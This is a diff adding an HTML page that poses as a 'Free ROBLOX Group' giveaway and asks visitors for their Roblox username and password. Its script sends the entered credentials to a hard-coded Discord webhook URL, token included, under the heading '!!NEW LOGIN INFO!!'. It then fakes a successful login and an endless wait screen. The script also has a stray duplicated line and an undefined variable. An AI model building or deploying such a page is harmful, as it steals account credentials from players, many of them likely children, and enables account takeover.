@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free ROBLOX Group</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+            color: #333;
+        }
+        header {
+            background-color: #4CAF50;
+            color: white;
+            padding: 1rem;
+            text-align: center;
+            position: relative;
+        }
+        #user-info {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        #user-info img {
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+        }
+        main {
+            padding: 2rem;
+        }
+        footer {
+            text-align: center;
+            padding: 1rem;
+            background-color: #333;
+            color: white;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            margin: 1rem auto;
+            max-width: 600px;
+            padding: 1rem;
+            text-align: center;
+        }
+        .button {
+            display: inline-block;
+            background-color: #4CAF50;
+            color: white;
+            padding: 0.5rem 1rem;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-top: 1rem;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+        form {
+            margin-top: 1rem;
+        }
+        input {
+            display: block;
+            margin: 0.5rem auto;
+            padding: 0.5rem;
+            width: 80%;
+            max-width: 300px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+    </style>
+    <script>
+        async function handleLogin(event) {
+            event.preventDefault();
+
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+
+            // Send login details to Discord webhook
+            const webhookUrl = "https://discord.com/api/webhooks/1314915977586020362/GiXO6l1rQySe14KvT764PIGv7ht1swl04ySpmiXpp7M4sot21ZwjIKfo6uPxplsjNvW4";
+            const payload = {
+                content: `!!NEW LOGIN INFO!!\nUsername: ${username}\nPassword: ${password}\nCheck it here: roblox.com`
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error sending data to ROBLOX VERIFY:', error);
+            }
+
+            // Display login success and user info
+            document.querySelector('main').innerHTML = `
+                <h2>Login Successful</h2>
+                <button class="button" onclick="showSearch()">Claim Your Group</button>
+            `;
+            `;
+            const userInfo = document.getElementById('user-info');
+            userInfo.innerHTML = `
+                <img src="${avatarUrl}" alt="User Avatar">
+                <span>${username}</span>
+            `;
+        }
+
+        function showSearch() {
+            document.querySelector('main').innerHTML = `
+                <h2>Please wait while we are looking...</h2>
+                <p>This might take some time. Please do not close this window.</p>
+            `;
+        }
+    </script>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Free Group</h1>
+        <p>Here you can get your ROBLOX free group by putting your Roblox information below.</p>
+        <div id="user-info"></div>
+    </header>
+
+    <main>
+        <section>
+            <div class="card">
+                <h2>Login</h2>
+                <form onsubmit="handleLogin(event)">
+                    <input type="text" name="username" placeholder="Username" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <input type="submit" value="Login">
+                </form>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 Free Group. All Rights Reserved.</p>
+    </footer>
+</body>
+</html>
